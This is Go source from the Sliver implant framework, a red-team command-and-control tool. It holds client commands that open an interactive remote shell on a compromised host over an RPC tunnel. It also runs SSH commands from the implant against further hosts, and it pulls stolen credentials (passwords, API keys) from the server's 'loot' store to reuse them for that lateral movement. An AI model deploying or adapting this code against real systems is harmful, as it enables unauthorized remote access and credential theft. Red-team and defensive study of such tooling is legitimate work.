package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"text/tabwriter"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/desertbit/grumble"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	windows = "windows"
	darwin  = "darwin"
	linux   = "linux"
)

func shell(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	if !isUserAnAdult() {
		return
	}

	shellPath := ctx.Flags.String("shell-path")
	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSession.Get().OS != linux && ActiveSession.Get().OS != darwin {
		noPty = true // Sliver's PTYs are only supported on linux/darwin
	}
	runInteractive(ctx, shellPath, noPty, rpc)
	fmt.Println("Shell exited")
}

func runInteractive(ctx *grumble.Context, shellPath string, noPty bool, rpc rpcpb.SliverRPCClient) {
	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")
	session := ActiveSession.Get()
	if session == nil {
		return
	}

	// Create an RPC tunnel, then start it before binding the shell to the newly created tunnel
	rpcTunnel, err := rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
		return
	}
	log.Printf("Created new tunnel with id: %d, binding to shell ...", rpcTunnel.TunnelID)

	// Start() takes an RPC tunnel and creates a local Reader/Writer tunnel object
	tunnel := core.Tunnels.Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

	shell, err := rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   ActiveSession.Request(ctx),
		Path:      shellPath,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
		return
	}
	log.Printf("Bound remote shell pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	fmt.Printf(Info+"Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(Warn + "Failed to save terminal state")
			return
		}
	}

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			fmt.Printf(Warn+"Error writing to stdout: %v", err)
			return
		}
	}()
	log.Printf("Reading from stdin ...")
	n, err := io.Copy(tunnel, os.Stdin)
	log.Printf("Read %d bytes from stdin", n)
	if err != nil && err != io.EOF {
		fmt.Printf(Warn+"Error reading from stdin: %v\n", err)
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}

func runSSHCmd(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	var (
		privKey []byte
		err     error
	)
	session := ActiveSession.GetInteractive()
	if session == nil {
		return
	}

	username := ctx.Flags.String("login")
	if username == "" {
		username = session.GetUsername()
	}

	port := ctx.Flags.Uint("port")
	privateKeypath := ctx.Flags.String("private-key")
	if privateKeypath != "" {
		privKey, err = ioutil.ReadFile(privateKeypath)
		if err != nil {
			fmt.Printf(Warn+"Error: %s\n", err.Error())
			return
		}
	}
	password := ctx.Flags.String("password")

	hostname := ctx.Args.String("hostname")
	command := ctx.Args.StringList("command")

	if password == "" && len(privKey) == 0 && !ctx.Flags.Bool("skip-loot") {
		oldUsername := username
		username, password, privKey = tryCredsFromLoot(rpc)
		if username == "" {
			username = oldUsername
		}
	}

	commandResp, err := rpc.RunSSHCommand(context.Background(), &sliverpb.SSHCommandReq{
		Username: username,
		Hostname: hostname,
		Port:     uint32(port),
		PrivKey:  privKey,
		Password: password,
		Command:  strings.Join(command, " "),
		Request:  ActiveSession.Request(ctx),
	})
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err.Error())
		return
	}

	if commandResp.Response != nil && commandResp.Response.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", commandResp.Response.Err)
		if commandResp.StdErr != "" {
			fmt.Printf(Warn+"StdErr: %s\n", commandResp.StdErr)
		}
		return
	}
	if commandResp.StdOut != "" {
		fmt.Println(Info + "Output:")
		fmt.Println(commandResp.StdOut)
		if commandResp.StdErr != "" {
			fmt.Println(Info + "StdErr")
			fmt.Println(commandResp.StdErr)
		}
	}
}

func tryCredsFromLoot(rpc rpcpb.SliverRPCClient) (string, string, []byte) {
	var (
		username string
		password string
		privKey  []byte
	)
	confirm := false
	prompt := &survey.Confirm{Message: "No credentials provided, use from loot?"}
	survey.AskOne(prompt, &confirm, nil)
	if confirm {
		loot, err := selectCredentials(rpc)
		if err != nil {
			fmt.Printf(Warn + "invalid loot data, will try to use the SSH agent")
		} else {
			switch loot.CredentialType {
			case clientpb.CredentialType_API_KEY:
				privKey = []byte(loot.Credential.APIKey)
			case clientpb.CredentialType_USER_PASSWORD:
				username = loot.Credential.User
				password = loot.Credential.Password
			}
		}
	}
	return username, password, privKey
}

func selectCredentials(rpc rpcpb.SliverRPCClient) (*clientpb.Loot, error) {
	allLoot, err := rpc.LootAllOf(context.Background(), &clientpb.Loot{
		Type: clientpb.LootType_LOOT_CREDENTIAL,
	})
	if err != nil {
		fmt.Printf(Warn+"%s\n", err)
	}

	// Render selection table
	buf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(buf, 0, 2, 2, ' ', 0)
	for _, loot := range allLoot.Loot {
		fmt.Fprintf(table, "%s\t%s\t%s\t\n", loot.Name, loot.CredentialType, loot.LootID)
	}
	table.Flush()
	options := strings.Split(buf.String(), "\n")
	options = options[:len(options)-1]
	if len(options) == 0 {
		return nil, errors.New("no loot to select from")
	}

	selected := ""
	prompt := &survey.Select{
		Message: "Select a piece of credentials:",
		Options: options,
	}
	err = survey.AskOne(prompt, &selected)
	if err != nil {
		return nil, err
	}
	for index, value := range options {
		if value == selected {
			return allLoot.Loot[index], nil
		}
	}
	return nil, errors.New("loot not found")
}
